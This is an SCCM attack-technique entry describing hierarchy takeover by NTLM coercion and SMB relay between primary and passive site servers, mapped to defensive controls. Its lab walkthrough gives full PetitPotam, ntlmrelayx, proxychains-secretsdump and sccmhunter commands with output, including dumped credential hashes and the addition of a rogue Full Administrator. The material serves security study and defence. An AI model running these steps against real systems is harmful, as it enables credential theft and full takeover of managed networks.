# TAKEOVER-3
## Description
Hierarchy Takeover via NTLM Coercion and Relay from Site Server to SMB

## ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-3.1: Primary site server 
    - TAKEOVER-3.2: Passive site server

- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target

### Relay
- Connectivity from the relay server to SMB on target host 
- SMS Provider role installed on target preferred (default) but not required
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present
    - `RestrictReceivingNTLMTraffic` = `0` or not present
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target

## Summary

For high availability configurations the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover. During setup, the passive site server is [required](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#configurations-for-the-site-server-in-passive-mode) to be a member of the active site server's local administrator group. An attacker who is able to successfully coerce NTLM authentication from a active or passive site server via SMB and relay it to SMB on a remote active or passive site server to compromise the host can either:
1. Authenticate to its own hosted SMS Provider as the site server
2. Authenticate to LDAP(s) as the site server and configure resource-based constrained delegation (RBCD) to impersonate a SCCM Full Administrator

## Impact

The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
- [DETECT-1: Monitor site system computer accounts authenticating from a source that is not its static IP](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-4: Monitor group membership changes for SMS Admins](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)

## Subtechniques
- TAKEOVER-3.1: NTLM relay primary site server SMB to SMB on passive site server
- TAKEOVER-3.2: NTLM relay passive site server SMB to SMB on primary site server


## Examples
The steps to execute TAKEOVER-3.1 and TAKEOVER-3.2 are the same except thE coercion target and relay target are opposite.

1. Use `SCCMHunter` to profile SCCM infrastructure

The results of the `find` module indicate:
- The *SCCM.INTERNAL.LAB* and *PASSIVE.INTERNAL.LAB* sytems are both site servers in the "LAB" site
- The *SCCM.INTERNAL.LAB* host is the active site server and the *PASSIVE.INTERNAL.LAB* host is the passive site server
- SMB signing is disabled on both systems


```
[04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
[04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
                       +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
                       | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+ 
```


2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service on the primary site server identified in the previous step.  The `-socks` flag is used to hold the authenticated session open

```
└─# python3 ntlmrelayx.py -t smb://TARGET_SITE_SERVER -smb2support -socks
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

3. From the attacker host, coerce NTLM authentication from the passive site server via SMB, targeting the relay server's IP address:

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP> 

Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the SMB service on the site server and the authenticated session is held open

```
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121
[*] Authenticating against smb://10.10.100.121 as LAB/PASSIVE$ SUCCEED
[*] SOCKS: Adding LAB/PASSIVE$@10.10.100.121(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
[*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)
```



 5. Proxy `secretsdump.py` in the context of the passive site server through the authenticated session to recover the primary site server's hashed credential

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─#  proxychains secretsdump.py lab/passive\$@sccm.internal.lab                     
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.121:445  ...  OK
[*] Target system bootKey: 0x436a3e67c2c89ded60aeb1f1819428c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:003d349493bc6acfb242ae5c2ff3d819:::
[*] Dumping cached domain logon information (domain/username:hash)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
lab\SCCM$:aes256-cts-hmac-sha1-96:76bf72e59677dfe072fd6609ccdc1343d318f7cc557b25588b36046747f80172
lab\SCCM$:aes128-cts-hmac-sha1-96:b2d7f1a79de08211ae6a518c82a715f4
lab\SCCM$:des-cbc-md5:5de98a07aefb983e

```



6. Use `sccmhunteer` as the site server to the Administration Service API and add an arbitrary user as Full Admin

```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121
    
[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
() C:\ >> show_admins 
[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
() (C:\) >> get_user specter
[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
[06:53:13 PM] INFO     [+] User found.                                                                                                                       
[06:53:14 PM] INFO     ------------------------------------------                                                                                            
                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
                       FullDomainName: INTERNAL.LAB                                                                                                          
                       FullUserName: specter                                                                                                              
                       Mail:                                                                                                                                 
                       NetworkOperatingSystem: Windows NT                                                                                                    
                       ResourceId: 2063597574                                                                                                                
                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
                       UniqueUserName: lab\specter                                                                                                           
                       UserAccountControl: 66048                                                                                                             
                       UserName: specter                                                                                                           
                       UserPrincipalName: specter@internal.lab                                                                                        
                       ------------------------------------------                                                                                            
() (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
() (C:\) >> show_admins 
[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
[08:46:39 PM] INFO     specter 
```



## References
- Chris Thompson, SCCM Site Takeover via Automatic Client Push Installation, https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1
- Garrett Foster, SCCM Hierarchy Takeover with High Availability, https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43
- Microsoft, Site server high availability in Configuration Manager, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability